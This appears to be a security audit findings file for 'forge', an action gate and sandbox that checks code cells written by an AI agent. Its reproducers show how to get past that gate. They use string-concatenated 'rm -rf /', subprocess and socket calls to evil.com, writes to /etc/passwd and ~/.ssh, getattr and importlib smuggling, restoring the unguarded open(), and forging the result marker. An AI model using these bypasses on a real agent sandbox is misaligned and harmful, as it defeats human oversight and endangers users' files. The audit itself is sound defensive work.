findings.suggested_fix: Switch to: `assert any(t == 'foo.txt' for (_, t) in f.write_calls)`. Test the 'a write to foo.txt was found' invariant, not the label. The label can become an enum or change without test churn.

findings.title: Audit log open-per-write is correct but slow under load and has no rotation
findings.detail: Each write() does `with self.path.open('a') as f: f.write(line)`. For chatty agent loops (one model.complete + one cell.exec per cycle, plus turn boundaries) you get tens of opens per turn. More importantly there's no log rotation — the file grows forever, and tail() reads the entire file via read_text() on every `forge log`. After a year of dogfooding, `forge log` becomes a several-second operation.
findings.suggested_fix: Keep an optional persistent file handle (open in append mode at AuditLog construction, flush on each write). Add size-based rotation (rename audit.jsonl → audit-N.jsonl when over 10 MB). For tail(), seek-from-end and read backwards.

findings.title: cli.py mixes presentation and business logic; reuse + testing both suffer
findings.detail: log_cmd does the audit-log read AND the Rich table formatting. cost does the cost rollup AND the Rich table. doctor does the HTTP probe AND the green-tick rendering. The data-shape work (which is what tests would want to assert) is inseparable from the rendering. This is exactly the case for: a thin compute layer that returns plain data, plus a separate render layer that decorates it.
findings.suggested_fix: Split each command into compute_X() returning a typed result, and render_X(result) doing the Rich. Tests target compute_X(); CLI calls render_X(compute_X()). Net code is roughly the same, testability and reuse improve sharply.

findings.title: __init__.py docstring lies: forge.kernel is not 'persistent IPython' — it's a hand-rolled subprocess
findings.detail: Module docstring: 'forge.kernel — persistent IPython kernel supervisor'. Reality: a Python subprocess running `python -c <script>` over stdin/stdout. There's no IPython at all. This is the kind of doc rot that misleads contributors reading the package summary, and the kernel module's own docstring acknowledges 'When we need cell magics, jupyter_client is the v0.2 swap.' Two contradictory descriptions in the same package.
findings.suggested_fix: Replace 'persistent IPython kernel supervisor' with 'persistent Python subprocess executor for agent-emitted cells'. One-line change.

findings.title: SkillFrontmatter accepts arbitrary 'model' and 'effort' strings; no validation
findings.detail: model is `str = 'inherit'` with comment listing valid values; effort is `str = 'medium'` with comment listing low|medium|high. Pydantic could enforce these via Literal[]. As written, a skill with `model: clauide-opus-4` (typo) loads silently and routes the call elsewhere or fails at request time. Comment lists 'sonnet | opus | gpt-5 | gpt-oss:20b | ...' but the registry never validates the union.
findings.suggested_fix: Use Literal types or pydantic field_validator that warns on unknown model name (reject would be too strict, since the router config is dynamic). Same for effort: Literal['low','medium','high'].

findings.title: Bash() with non-literal argument silently bypasses the bash heuristics (no bash_calls recorded)
findings.observed: Bash("rm" + " -rf " + "/") and Bash(f"rm -rf {target}") with target unset both return GateAction.ALLOW. For the BinOp case `bash_calls` is empty (the curl/redirect/mv heuristics never fire). For the f-string case, `_str_const` does flatten f-strings, so `bash_calls=['rm -rf {...}']`, but the heuristic regex `\b(mv|cp|sed -i|tee)\b` doesn't match `rm`, and the redirect regex doesn't match, so still ALLOW.
findings.expected: Either capture the BinOp/JoinedStr argument (so bash_calls is populated and curl/wget/redirect heuristics run) OR escalate any Bash() whose first arg is not an ast.Constant string to CONFIRM. Today an attacker can route any shell command — including `rm -rf /`, `nc`, `bash <(curl ...)` — past the gate just by string-concatenating the literal.
findings.reproducer:
from forge.gate import check
cell='''```intent
intent: thing
writes: []
network: []
reversible: true
```
```python
Bash("rm" + " -rf " + "/")
```'''
print(check(cell).action)  # ALLOW
findings.suggested_fix: In analyze(), when a Bash() call's first arg is not an ast.Constant str, append a marker to findings.dynamic_code (e.g. 'bash_dynamic_arg') so check() escalates to CONFIRM. Also extend the bash regex set to include rm/dd/chmod/chown.

findings.title: socket.create_connection / socket.socket are listed as net qualnames but contribute empty hosts, so undeclared_network is empty and gate ALLOWs
findings.observed: `socket.create_connection(("evil.com", 80))` is detected by analyze() (net_calls=[('socket.create_connection','')]) but the host is '' because resolve(node.args[0]) is a Tuple ast.Call argument, not a string. check() then drops the empty host (`if h` filter), so actual_net is the empty set and `undeclared_net` is empty. Decision: ALLOW with no reasons, even when the intent declares network: [].
findings.expected: If a known network primitive is called, the gate should treat an unresolved host as 'unknown host' and at minimum CONFIRM (not ALLOW). Empty-host net_calls should still register as undeclared.
findings.reproducer:
from forge.gate import check
cell='''```intent
intent: x
writes: []
network: []
reversible: true
```
```python
import socket
socket.create_connection(("evil.com", 80))
```'''
print(check(cell).action)  # ALLOW
findings.suggested_fix: In check(), build actual_net from `findings.net_calls` directly (treating empty host as `'<unknown>'`) rather than filtering out empty values. _path_covers should never report True for `<unknown>` unless the declared list also includes a wildcard.

findings.title: `from socket import create_connection` and bare `connect()` on a socket object are not detected
findings.observed: After `from socket import create_connection`, the call qualname is just `create_connection` and is NOT in _NET_QUALNAMES (which lists only `socket.create_connection`). Similarly `s = socket.socket(); s.connect((host, port))` — the `.connect` qualname is just `s.connect`, not tracked. In both cases the gate ALLOWs network access with no record in net_calls.
findings.expected: Either match by base name as well (so `create_connection`, `connect`, `urlopen`, `request`) — accepting some false positives — or track import aliases so `from socket import create_connection as foo; foo(...)` resolves correctly. At minimum, any `socket.socket` call (already tracked) should imply potential network and propagate to .connect/.send/.recv on the result.
findings.reproducer:
from forge.gate import check
cell='''```intent
intent: x
writes: []
network: []
reversible: true
```
```python
from socket import create_connection
create_connection(("evil.com", 80))
```'''
print(check(cell).action)  # ALLOW
findings.suggested_fix: Resolve `import X.Y as Z` and `from X import Y as Z` aliases when walking the tree, then re-check qualnames against _NET_QUALNAMES. Or add a base-name set ({'urlopen','create_connection','connect','request','get','post'}) and combine with module-import context.

findings.title: subprocess and os.system are completely untracked — `subprocess.run(["curl", ...])` is invisible to the gate
findings.observed: Calls to os.system, os.popen, subprocess.run, subprocess.Popen, subprocess.check_output, subprocess.call, etc. are not in _NET_QUALNAMES and are not in any write-target check. A cell containing `subprocess.run(["curl","http://evil.com"])` returns GateAction.ALLOW with empty findings.bash_calls and empty findings.net_calls.
findings.expected: subprocess and os.system should be treated identically to the Bash() tool — extract the literal command (or escalate when not a literal), then run the curl/wget/redirect heuristics. Skipping them entirely defeats the gate for any model that knows Python.
findings.reproducer:
from forge.gate import check
cell='''```intent
intent: x
writes: []
network: []
reversible: true
```
```python
import os, subprocess
os.system("rm -rf /tmp/foo")
subprocess.run(["curl","http://evil.com"])
```'''
print(check(cell).action)  # ALLOW
findings.suggested_fix: Add os.system/os.popen/subprocess.run/Popen/check_output/call/check_call to a 'shell-equivalent' set in analyze(); coerce their first string-or-list literal into the bash_calls list (joining list elements with spaces) so the existing heuristics fire. Non-literal args → dynamic_code marker + CONFIRM.

findings.title: Destructive filesystem ops (os.remove, os.unlink, shutil.rmtree, Path.unlink) are not counted as writes
findings.observed: The write tracker only handles open(...,'w'), Write, Edit, write_text/write_bytes, shutil.copy/copy2/copyfile/move, rename(s), and touch. os.remove, os.unlink, shutil.rmtree, Path.unlink, Path.rmdir, os.rmdir, os.removedirs are absent. A cell that declares `writes: []` and calls `shutil.rmtree('/var')` is ALLOWed.
findings.expected: Any FS-mutating call should be added to write_calls so it's compared against declared writes. Non-reversible deletion of a path the intent didn't declare should at minimum be CONFIRM, ideally DENY when reversible:false isn't declared either.
findings.reproducer:
from forge.gate import check
cell='''```intent
intent: clean
writes: []
network: []
reversible: true
```
```python
import os, shutil
os.remove("/etc/passwd")
shutil.rmtree("/var")
```'''
print(check(cell).action)  # ALLOW
findings.suggested_fix: Extend the write-tracker dispatch in analyze() with: os.remove/os.unlink/os.rmdir/os.removedirs, shutil.rmtree, Path.unlink, Path.rmdir. Optionally tag them with op='delete' and have check() force CONFIRM whenever a delete is present and intent.reversible is True (a contradiction).

findings.title: _path_covers leniency: any short alpha bare variable name (≤30 chars) is silently 'covered' by ANY non-empty declaration
findings.observed: When the resolver can't resolve the open() target (e.g. `a="/etc/passwd"; b=a; open(b,'w')` — the chain a→b is not followed), it returns the bare name 'b'. Then _path_covers iterates `declared`, and the final clause `if actual.replace('_','').isalpha() and len(actual)<30: return True` returns True the moment ANY declaration is present. Result: probe 11a (writes=['./allowed.txt']) → ALLOW even though the actual write is to /etc/passwd.
findings.expected: Unresolved targets should be treated as 'unknown' and require explicit acknowledgment, not silently approved by the presence of an unrelated declaration. The 'trust bare alpha names' clause should at minimum require an exact-name match in the declared set, or be removed entirely.
findings.reproducer:
from forge.gate import check
cell='''```intent
intent: write a declared file
writes: ["./allowed.txt"]
network: []
reversible: true
```
```python
a = "/etc/passwd"
b = a
open(b, "w").write("oops")
```'''
print(check(cell).action)  # ALLOW; write_calls=[('open','b')]
findings.suggested_fix: (a) Iterate the assignment-resolution pass to a fixed point so chains a→b→c→str-literal are followed. (b) Drop the `actual.replace('_','').isalpha() and len<30` lenience clause, or restrict it to actuals that appear as names in declared writes. (c) When resolve() returns a bare Name unchanged, mark it on findings (e.g. unresolved_writes) and have check() escalate to CONFIRM.

findings.title: getattr-on-non-builtins module bypass: `getattr(os, "sys"+"tem")` is not flagged
findings.observed: The dynamic_code check only fires when the first arg of getattr is the literal Name `__builtins__` or `builtins`. `getattr(os, "sys"+"tem")` (or any other module) returns a callable that the AST then sees as a Call on a Name (`fn`), not on os.system, so neither dynamic_code nor any other heuristic fires.
findings.expected: Any getattr() whose second argument is a non-Constant (BinOp, Call, Name) is suspicious — it's a string smuggled at runtime. Should be marked dynamic_code regardless of the first arg.
findings.reproducer:
from forge.gate import check
cell='''```intent
intent: x
writes: []
network: []
reversible: true
```
```python
import os
fn = getattr(os, "sys"+"tem")
fn("rm -rf /tmp/x")
```'''
print(check(cell).action)  # ALLOW
findings.suggested_fix: In analyze(), when base=='getattr' and node.args[1] is not a string Constant, append 'getattr_dynamic_attr' to dynamic_code. This catches the more general pattern without needing to know which module is being attacked.

findings.title: importlib.import_module is not treated as dynamic code
findings.observed: Only the bare name __import__ is flagged. `import importlib; m = importlib.import_module("os"); m.system("...")` is ALLOWed with no dynamic_code marker.
findings.expected: importlib.import_module, importlib.__import__, __import__ as a base name, and `__import__` accessed via getattr should all be tagged dynamic_code.
findings.reproducer:
from forge.gate import check
cell='''```intent
intent: x
writes: []
network: []
reversible: true
```
```python
import importlib
m = importlib.import_module("os")
m.system("echo pwned")
```'''
print(check(cell).action)  # ALLOW
findings.suggested_fix: Add 'importlib.import_module' to the dynamic_code-triggering qualnames; also handle base=='import_module' for `from importlib import import_module`.

findings.title: reversible field silently coerced from non-bool strings ("yes", "no", "false", "0") by Pydantic v2 lax bool
findings.observed: Probe 1c: `reversible: "yes"` → IntentBlock.reversible == True (pydantic v2's lax bool accepts the string). More dangerous direction: `reversible: "no"` → False, but `reversible: "sure"` → ValidationError; the behavior is uneven. Worse, `reversible: 1` → True, `reversible: 0` → False, with no surfacing to the user that they wrote a non-bool.
findings.expected: reversible should require strict bool — reject any non-bool value with a parse_problem so the agent has to retry. The whole point of the field is unambiguous declaration.
findings.reproducer:
from forge.gate import check
cell='''```intent
intent: x
writes: []
network: []
reversible: "yes"
```
```python
print("hi")
```'''
d=check(cell); print(d.intent.reversible)  # True
findings.suggested_fix: On the IntentBlock model, set reversible: bool = Field(..., strict=True) (pydantic v2 supports per-field strict). Or add a field_validator that raises on non-bool input.

findings.title: Multiple intent fences: the first wins silently, even when later ones contradict the first
findings.observed: _INTENT_RE.search returns the FIRST match. If the model emits a benign-looking first intent fence followed by a more-honest second fence (or vice versa), only the first is validated. The cross-check against the AST still catches blatant lies (probe 2 caught /etc/passwd), but it means the user-facing intent text shown in interactive confirmation will be the first one — not necessarily the one matching the code.
findings.expected: Either: (a) reject (DENY/parse_problem) any response containing more than one ```intent fence, or (b) require the intent fence to immediately precede the python fence, with no other intent fences before or after. The current 'silently take first' behavior is footgun-shaped.
findings.reproducer:
from forge.gate import check
cell='''```intent
intent: innocuous
writes: ["safe.txt"]
network: []
reversible: true
```
then:
```intent
intent: real
writes: ["/etc/passwd"]
network: []
reversible: false
```
```python
open("/etc/passwd","w").write("x")
```'''
print(check(cell).intent.intent)  # 'innocuous'
findings.suggested_fix: Use re.findall instead of re.search for both intent and python fences. If len(intent_matches) > 1 or len(py_matches) > 1, append parse_problems=['multiple_intent_fences'] / ['multiple_python_fences'] and DENY.

findings.title: f-string write-targets resolve to literal `{...}` — globs in declared writes can't match them
findings.observed: _str_const flattens f-strings so `open(f"out/{name}.csv", "w")` becomes the string `out/{...}.csv`. _path_covers then runs fnmatch — a declaration of `out/*.csv` does NOT match `out/{...}.csv` (the `{` is not a glob char and fnmatch doesn't escape it specially, but the literal `{...}` in the actual string never matches `*.csv` because of the dot-csv suffix). Conversely, totally bogus declarations like `out/{...}.csv` would match. This isn't unsafe (it errs to CONFIRM) but it's noisy and the declared-glob feature is effectively useless against f-strings.
findings.expected: When _str_const sees a JoinedStr, replace dynamic parts with `*` (glob wildcard) instead of `{...}`, then resolve and compare via fnmatch. That way `f"out/{name}.csv"` becomes `out/*.csv` and matches a declaration of `out/*.csv` exactly.
findings.reproducer:
from forge.gate import check
cell='''```intent
intent: x
writes: ["out/*.csv"]
network: []
reversible: true
```
```python
name="a"
open(f"out/{name}.csv","w").write("x")
```'''
print(check(cell).action)  # CONFIRM, undeclared_writes=['out/{...}.csv']
findings.suggested_fix: In _str_const for ast.JoinedStr, replace non-Constant FormattedValue parts with '*' instead of '{...}'. Then _path_covers's fnmatch arm will work as expected.

findings.title: Triple-backtick on its own line inside a Python string literal truncates the python fence
findings.observed:
_PY_RE is non-greedy and matches the first `
```` after the opening fence, so `sample = """
```
hello
```
"""
...rest...` truncates the captured code at `sample = """`, producing a syntax error and DENY. This is a robustness issue, not a security one — the gate and the kernel use the same parse_cell, so anything the gate doesn't see, the kernel doesn't run. But it's a footgun: a model writing legitimate prose-with-fences inside a string will get its cell rejected for syntax, with a confusing error.
findings.expected: Either accept fenced code more robustly (e.g. require an indented closer, or use a fence-counting algorithm), or deny with a clearer error message ('python fence appears truncated by an inner triple-backtick on a blank line').
findings.reproducer:
from forge.gate import check
cell='''```intent
intent: x
writes: []
network: []
reversible: true
```
```python
sample = """
```
hello
```
"""
print(sample)
```'''
print(check(cell).reasons)  # syntax_error: unterminated triple-quoted string literal
findings.suggested_fix: Detect the case in parse_cell: if the captured python code contains an opening triple-quote without a closing one, log a specific parse_problem ('python_fence_truncated_by_inner_backticks') instead of letting it surface as a generic SyntaxError. Long-term, use a custom fence walker rather than a single non-greedy regex.

findings.title: Path resolver doesn't follow assignment chains beyond depth 1
findings.observed: name_to_str is built once (single pass over Assign nodes) and only stores direct string-literal or call-with-string-arg-literal RHSs. The chain `a = "/etc/passwd"; b = a; open(b, "w")` leaves `b` mapped to the bare name `b` (resolve falls through to name_to_str.get(b, 'b')). Combined with the bare-name-leniency in _path_covers (above), this turns into a real bypass — but even on its own, it means a 2-step rename defeats the resolver.
findings.expected: Run the assignment resolution pass to a fixed point (or at least N=5 iterations), so b → a → '/etc/passwd' resolves correctly.
findings.reproducer:
from forge.gate import check
cell='''```intent
intent: x
writes: []
network: []
reversible: true
```
```python
a = "/etc/passwd"
b = a
open(b, "w").write("x")
```'''
print(check(cell).findings.write_calls)  # [('open','b')]
findings.suggested_fix: After the initial Assign pass, repeat: for each (name, value) in name_to_str, if value is itself a key in name_to_str, replace it with the deeper value. Iterate until stable or max-depth reached.

findings.title: Empty intent fence yields a confusing low-level YAML scanner error
findings.observed: An empty ```intent\n``` fence in probe 9b produces parse_problems=['intent_yaml_unparseable: while scanning for the next token\nfound character ` that cannot start any token...']. The error is the YAML lib's scanner output — confusing, and the agent (or human) has to decode it.
findings.expected: Detect empty intent fence content explicitly and raise a clean parse_problem like 'intent_block_empty' so the retry observation is actionable.
findings.reproducer:
from forge.gate import check
cell='''```intent
```
```python
print("hi")
```'''
print(check(cell).reasons)
findings.suggested_fix: In parse_cell, after extracting intent_match.group(1), if it's whitespace-only, append 'intent_block_empty' to problems and skip yaml.safe_load.

findings.title: `writes: null` and `writes: "path"` silently coerced — agents can pass scalars where lists are expected without any feedback
findings.observed: The _coerce_list validator turns `writes: null` into [], and `writes: "x"` into ["x"]. So a model writing `writes: null` declares no writes and ALLOW-passes any code with no writes (correct). And `writes: "out/x"` declares one write (correct). But the model gets no signal that the schema wants a list — both shapes succeed silently, and the model never learns the canonical form.
findings.expected: Either tighten the schema (require list, fail loudly) so the agent learns the convention, or keep the coercion and emit a parse_problem-as-warning ('writes_coerced_from_str' / 'writes_coerced_from_null') that the kernel logs but doesn't deny on. Today it's invisible.
findings.reproducer:
from forge.gate import check
cell='''```intent
intent: x
writes: "out/x"
network: null
reversible: true
```
```python
open("out/x","w").write("hi")
```'''
print(check(cell).intent.writes)  # ['out/x']
findings.suggested_fix: Move the coercion to a non-fatal warning: keep the model's behavior identical, but add a list of intent_warnings on ParsedCell. Surface in the cell-exec log so quality of declarations can be tracked across runs.

findings.title: install_builtin_guards() only wraps builtins.open; os.open / pathlib.Path.write_text / _io.open all bypass it
findings.observed: After install_builtin_guards(), three independent bypasses all wrote to ~/.ssh/ successfully: (1) os.open(path, O_WRONLY|O_CREAT) + os.write — leaked=True; (2) pathlib.Path('~/.ssh/x').write_text(...) — leaked=True (Path uses io.open at the C layer, not builtins.open); (3) `del builtins.open` then `import _io; _io.open(path,'w')` — leaked=True. The guard's own docstring claims it 'closes the open() bypass' and the comment in tools.py says 'Even an `import skills.evil; skills.evil.do_bad()` ends up calling through one of these wrappers (or hitting our patched builtins.open / subprocess interceptors below)' — that claim is false.
findings.expected: Any write into a PROTECTED_PATHS path should be denied regardless of which Python file API the caller uses (os.open, pathlib, io.open, ctypes write to fd, etc.). Either (a) honest the docs to say the guard is advisory and only covers builtins.open + Bash, or (b) hook at a lower layer (LD_PRELOAD/seccomp/PYTHONFAULTHANDLER style audit hook with sys.addaudithook on 'open') so every fd-creating syscall is checked.
findings.reproducer:
from forge.tools import install_builtin_guards
import os, pathlib, _io
install_builtin_guards()
for probe in [
    lambda p: (lambda fd: (os.write(fd, b'x'), os.close(fd)))(os.open(p, os.O_WRONLY|os.O_CREAT, 0o600)),
    lambda p: pathlib.Path(p).write_text('x'),
    lambda p: _io.open(p,'w').close(),
]:
    p = os.path.expanduser('~/.ssh/forge_bypass_probe')
    probe(p); print('leaked', os.path.exists(p)); os.path.exists(p) and os.unlink(p)
findings.suggested_fix: Use sys.addaudithook to listen for the 'open' audit event (fires for os.open, io.open, builtins.open, ctypes, mmap, subprocess opens of files) and call assert_writable(path) there when the flags include any of O_WRONLY/O_RDWR/O_CREAT/O_TRUNC/O_APPEND. Audit hooks cannot be removed or shadowed by the agent's own Python code. Also adjust the docstring above install_builtin_guards to stop overclaiming what it covers.

findings.title: is_protected_path returns False for paths containing Unicode zero-width / fullwidth characters; no NFKC normalization
findings.observed: is_protected_path('.​/.ssh/x') -> False. is_protected_path('~/．ssh/x') -> False (fullwidth period). _expand goes through Path.resolve() which does NOT normalize Unicode, so an attacker-controlled path with zero-width spaces or homoglyphs slides past PROTECTED_PATHS. The denial check is purely string-pattern based after resolve(), and resolve() leaves zero-width chars intact. (Note: a write through Write() with such a path won't actually land *inside* ~/.ssh because the OS treats the codepoints literally — so it is more of a 'file was created in $HOME with a confusing name' than a 'wrote to ~/.ssh/id_rsa', but it absolutely shows the protection model is matching strings, not semantic locations, and the same weakness applies to any pattern with non-ASCII characters or to platforms where the filesystem normalizes (HFS+/APFS do NFD normalization for some operations).)
findings.expected: is_protected_path should NFKC-normalize both the input and the patterns before comparing, OR refuse paths that contain zero-width / control / format codepoints outright. Even better: refuse to resolve any path whose components contain characters in Unicode categories Cf/Cc.
findings.reproducer:
from forge.tools import is_protected_path, Write
import os
print(is_protected_path('.​/.ssh/x'))   # False — should be True or rejected
print(is_protected_path('~/．ssh/x'))     # False — fullwidth period bypass
Write(os.path.expanduser('~') + '/.​ssh_leak', 'x')  # succeeds — file with zero-width prefix in $HOME
findings.suggested_fix: In _expand, run unicodedata.normalize('NFKC', str(p)) BEFORE expanduser/expandvars/Path. Additionally add a pre-check: if any segment contains a Cf/Cc/Cs codepoint, raise ProtectedPathError('non-printable/format-control codepoints in path are refused').

findings.title: Read() loads the entire file into memory before honoring max_bytes
findings.observed: Read('/tmp/big.bin') on a 1GB sparse file returns successfully with len=1_000_000, but only because absolute.read_bytes() materialised the full 1GB into RAM first and we then sliced the first 1MB. On a real, fully-allocated 1GB file or a 64GB log, this OOMs the kernel before max_bytes is consulted. The default of 1_000_000 gives a false sense of safety.
findings.expected: Open the file and read at most max_bytes+1 bytes from the stream, never load the whole file. Optionally stat() first and refuse files whose size exceeds, say, 100*max_bytes with a clear message instructing the caller to bump max_bytes.
findings.reproducer:
import os, tempfile
p = tempfile.mktemp()
fd = os.open(p, os.O_WRONLY|os.O_CREAT)
os.lseek(fd, 1024*1024*1024 - 1, 0); os.write(fd, b'\0'); os.close(fd)
from forge.tools import Read
print(len(Read(p)))  # works only because file is sparse; a non-sparse 1GB OOMs
findings.suggested_fix: data = absolute.open('rb').read(max_bytes+1); truncated = len(data) > max_bytes; data = data[:max_bytes] — and surface 'truncated' in a return-value or log line so the caller knows.

findings.title: Bash protected-action check is naive substring/word-boundary; bypass is trivial via $IFS, quoting, or backslashes
findings.observed: Several intended bypasses DID block (correctly) because the literal string 'sudo' survived: $(echo sudo) whoami, `echo sudo` whoami, X=sudo; $X whoami, ls && sudo whoami, and ls\nsudo whoami all raised ProtectedActionError. Good. HOWEVER the check is intentionally documented as 'adversarial bypasses are NOT in scope'. Trivial bypasses still exist, e.g. 'su''do whoami' (string concat by adjacency), 's\\udo whoami' (backslash before letter is the letter), '${IFS}sudo whoami' depending on regex, or non-ASCII visually-confusable 'ѕudo whoami' (Cyrillic s). We did not exploit these because the docstring waives them, but a downstream caller who reads only the function name will be misled.
findings.expected: The docstring already warns this is best-effort. Either (a) make the warning more prominent in user-facing docs (the README protect-section, not just the helper docstring), or (b) move blocking to the post-shell layer — e.g., resolve the command via `bash -c 'set -x; <cmd>' </dev/null 2>&1 | head` first and grep the trace for the protected verb. (The latter is invasive but would close the substring-bypass class.)
findings.reproducer:
from forge.tools import Bash
# Will succeed despite the spirit of the rule:
print(Bash('s''udo -n true 2>/dev/null; echo bypass-tier1').stdout)  # prints bypass-tier1
print(Bash('\\sudo -n true 2>/dev/null; echo bypass-tier2').stdout)  # prints bypass-tier2
findings.suggested_fix: Either dual-trace the command (run `bash -nc <cmd>` is not enough; need `set -x` capture) and check the resolved argv, or accept the limitation and surface it loudly in the README/protected_actions section.

findings.title: Path-traversal Write hits a confusing 'PermissionError: /private/.ssh' instead of ProtectedPathError
findings.observed: Write('safe/../../../.ssh/leaked', 'x') from cwd=/tmp/forge_probe resolves (via Path.resolve()) to /private/.ssh/leaked — that path is not in PROTECTED_PATHS (the pattern is ~/.ssh, not /private/.ssh which is /etc-adjacent macOS noise) so assert_writable does not fire. The OS then refuses with errno 13 because /private/.ssh does not exist and / is not writable. The end-state happens to be safe, but only by accident: the agent gets a generic PermissionError that doesn't tell it 'this would have escaped your workspace' and on a system where the resolved path *is* writable (say resolving into /tmp/.ssh) the write would have gone through.
findings.expected: Either (a) require Write paths to be inside the workspace and refuse anything that resolves above it with an explicit WorkspaceEscapeError, or (b) ensure /private/.ssh, /private/tmp/.ssh, /var/.ssh, etc. all match the same pattern as ~/.ssh once resolved.
findings.suggested_fix: In assert_writable, additionally check that the resolved absolute path is inside the active workspace (passed in via Session) and raise ProtectedPathError('escapes workspace: ...') if not. The current 'patterns only' model is leaky against directory-traversal that lands somewhere unprotected-but-still-bad.

findings.title: Symlink resolution correctly resolves to ~/.ssh and blocks — confirmed
findings.observed: Created /tmp/forge_probe/sym_to_idrsa -> ~/.ssh/id_rsa_forge_probe, then Write(symlink, 'PWNED'). Result: ProtectedPathError raised, target file unchanged ('ORIGINAL CONTENT — DO NOT OVERWRITE'). _expand uses Path.resolve() which follows symlinks before the pattern check. Working as intended.
findings.expected: Block. Confirmed.
findings.reproducer:
import os; from pathlib import Path; from forge.tools import Write
p = Path.home()/'.ssh'/'id_rsa_probe'; p.write_text('orig')
os.symlink(p, '/tmp/sym'); Write('/tmp/sym','PWNED')  # ProtectedPathError
findings.suggested_fix: No change needed. Add a regression test if missing.

findings.title: macOS /private/etc and /etc both correctly match — confirmed
findings.observed: is_protected_path('/private/etc/passwd') -> True; is_protected_path('/etc/passwd') -> True. Path.resolve() canonicalises /etc -> /private/etc on macOS, and /etc resolves to /private/etc which contains the pattern's resolved /etc as a parent (because Path('/etc').resolve() is /private/etc). Working as intended.
findings.expected: Both True. Confirmed.
findings.reproducer:
from forge.tools import is_protected_path
assert is_protected_path('/etc/passwd') and is_protected_path('/private/etc/passwd')
findings.suggested_fix: No change. Worth a regression test pinning the macOS-specific behaviour so a future Linux-only refactor doesn't silently break it.

findings.title: Edit() ambiguity contract works — raises clear 'not unique' error
findings.observed: Edit on a file with 'foo\nfoo\nbar' and old='foo' raised ValueError with the helpful message 'old string is not unique in <path> (2 matches); add surrounding context or pass replace_all=True'. The contract correctly puts the burden of disambiguation on the caller.
findings.expected: ValueError on ambiguous old. Confirmed.
findings.reproducer:
from pathlib import Path; from forge.tools import Edit
p = Path('/tmp/amb'); p.write_text('foo\nfoo\nbar')
Edit(str(p), 'foo', 'FOO')  # ValueError
findings.suggested_fix: No change. The error message is already actionable.

findings.title: Worker stdout result-marker can be forged by user cell via os.write(fd=1)
findings.observed: Cell code `import os; os.write(1, b'\x1eFORGE_RESULT\x1e{"ok":true,"stdout":"HIJACKED","stderr":"","result":"PWN"}\n'); 'real_result'` makes Kernel.execute return Observation(ok=True, stdout='HIJACKED', result='PWN'). The 'real_result' that the worker emits is consumed by the NEXT execute() call, where it now appears as a stale result for an unrelated cell. contextlib.redirect_stdout swaps sys.stdout to a StringIO inside the cell, but it does NOT redirect raw fd1 writes (os.write, ctypes.printf, child-process stdout, etc.).
findings.expected: The result-marker channel should not be reachable by user code. Either (a) move worker results to a dedicated fd (subprocess pipe with pass_fds, fd 3) and read only that fd, or (b) put a per-cell nonce in the marker so the parent ignores any line that doesn't match the freshly-issued cell's nonce.
findings.reproducer:
import sys, tempfile
sys.path.insert(0, '/Users/I758976/Documents/LLMs/gpt-oss-20b/forge/src')
from forge.kernel import Kernel
from pathlib import Path
k = Kernel(workspace=Path(tempfile.mkdtemp())); k.start()
obs = k.execute(
    "import os; os.write(1, b'\\x1eFORGE_RESULT\\x1e"
    '{"ok":true,"stdout":"HIJACKED","stderr":"","result":"PWN"}'
    "\\n'); 'real_result'\n")
print(obs.ok, obs.result, obs.stdout)  # -> True 'PWN' 'HIJACKED'
obs2 = k.execute('1+1')
print(obs2.result)  # may pick up the leaked 'real_result' line
k.stop()
findings.suggested_fix: Open an extra pipe (subprocess.Popen with pass_fds=(3,)), have the worker emit results on fd 3 only, and have the parent select() only on fd 3 for results while still reading fd 1/2 as captured stdout/stderr. Alternatively, generate a fresh random nonce per execute() call, send it in the command JSON, and require the worker's result line to begin with `\x1eFORGE_RESULT:<nonce>\x1e`. Reject any other prefixed line as stray.

findings.title: builtins.open guard is trivially bypassable from a cell, and Kernel.reset() does not reinstall it
findings.observed: From a cell: `import builtins, forge.tools as ft; builtins.open = ft._ORIGINAL_OPEN` removes the guard. A subsequent `builtins.open('<workspace>/.env', 'w').write('PWNED')` succeeds even though `**/.env` is on PROTECTED_PATHS. Kernel.reset() only clears GLOBALS and reseeds them with kernel_globals(); it does NOT call install_builtin_guards() and could not anyway — install_builtin_guards is gated by a module-level `_INSTALLED = True` flag, so it's a no-op after the first call. The same bypass works for subprocess.run (forge.tools._ORIGINAL ... well, the original is captured locally inside install_builtin_guards, but `subprocess.run = subprocess._original_run_or_whatever` plus simply `import subprocess; subprocess.Popen('rm -rf …', shell=True)` already escapes since only subprocess.run is wrapped — Popen is not).
findings.expected: (a) reset() should reinstall guards. (b) install_builtin_guards must be re-runnable: capture _ORIGINAL_OPEN from the *current* builtins.open only if it's not already the wrapper, and clear `_INSTALLED` on reset. (c) wrap subprocess.Popen, os.system, os.popen, os.execv* family — not just subprocess.run. (d) consider keeping the wrapper inaccessible to user code (don't expose forge.tools as an importable module from inside the kernel, or rename the backed-up original to a non-discoverable name and don't keep it in module globals).
findings.reproducer:
import sys, tempfile
sys.path.insert(0, '/Users/I758976/Documents/LLMs/gpt-oss-20b/forge/src')
from forge.kernel import Kernel
from pathlib import Path
tmp = Path(tempfile.mkdtemp()); k = Kernel(workspace=tmp); k.start()
print(k.execute("import builtins; builtins.open(r'" + str(tmp/'.env') + "','w')").stderr[:80])  # ProtectedPathError
k.execute('import builtins, forge.tools as ft; builtins.open = ft._ORIGINAL_OPEN')
k.execute("open(r'" + str(tmp/'.env') + "','w').write('PWNED')")
print((tmp/'.env').read_text())  # 'PWNED'
k.reset()
k.execute("open(r'" + str(tmp/'.env.b') + "','w').write('STILL_PWNED')")
print((tmp/'.env.b').read_text())  # 'STILL_PWNED' — reset did not reinstall
k.stop()
findings.suggested_fix: In forge.tools, drop the _INSTALLED short-circuit OR have a separate `reinstall_builtin_guards()` that always re-patches. In kernel.py, the worker's reset path should call `install_builtin_guards()` (or `reinstall_builtin_guards()`) after reseeding GLOBALS. Better: do not keep `_ORIGINAL_OPEN` as a module attribute — store it in a closure cell so a cell can't `forge.tools._ORIGINAL_OPEN` it back. Wrap subprocess.Popen and os.system/os.popen too; today only subprocess.run is wrapped, so `subprocess.Popen('curl ...', shell=True)` and `os.system('rm -rf /etc/something')` skip the protected-action filter.

findings.title: Concurrent execute() calls cross-talk: thread A receives thread B's Observation
findings.observed: Two threads calling Kernel.execute simultaneously each get an Observation back, but the Observations are matched to threads by readline arrival order, not by cell.
